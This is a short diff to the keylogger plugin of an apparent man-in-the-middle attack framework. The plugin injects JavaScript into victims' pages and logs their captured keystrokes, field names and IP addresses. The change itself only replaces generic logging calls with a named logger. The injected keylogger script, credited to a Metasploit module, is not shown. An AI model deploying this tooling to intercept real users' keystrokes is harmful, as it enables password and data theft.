@@ -22,6 +22,8 @@ from plugins.plugin import Plugin
 from plugins.Inject import Inject
 import logging
 
+mitmf_logger = logging.getLogger('mitmf')
+
 class jskeylogger(Inject, Plugin):
     name       = "Javascript Keylogger"
     optname    = "jskeylogger"
@@ -57,14 +59,14 @@ class jskeylogger(Inject, Plugin):
                     try:
                         nice += n.decode('hex')
                     except:
-                        logging.warning("%s ERROR decoding char: %s" % (request.client.getClientIP(), n))
+                        mitmf_logger.warning("%s ERROR decoding char: %s" % (request.client.getClientIP(), n))
 
             #try:
             #     input_field = input_field.decode('hex')
             #except:
-            #    logging.warning("%s ERROR decoding input field name: %s" % (request.client.getClientIP(), input_field))
+            #    mitmf_logger.warning("%s ERROR decoding input field name: %s" % (request.client.getClientIP(), input_field))
             
-            logging.warning("%s [%s] Field: %s Keys: %s" % (request.client.getClientIP(), request.headers['host'], input_field, nice))
+            mitmf_logger.warning("%s [%s] Field: %s Keys: %s" % (request.client.getClientIP(), request.headers['host'], input_field, nice))
 
     def msf_keylogger(self):
         #Stolen from the Metasploit module http_javascript_keylogger
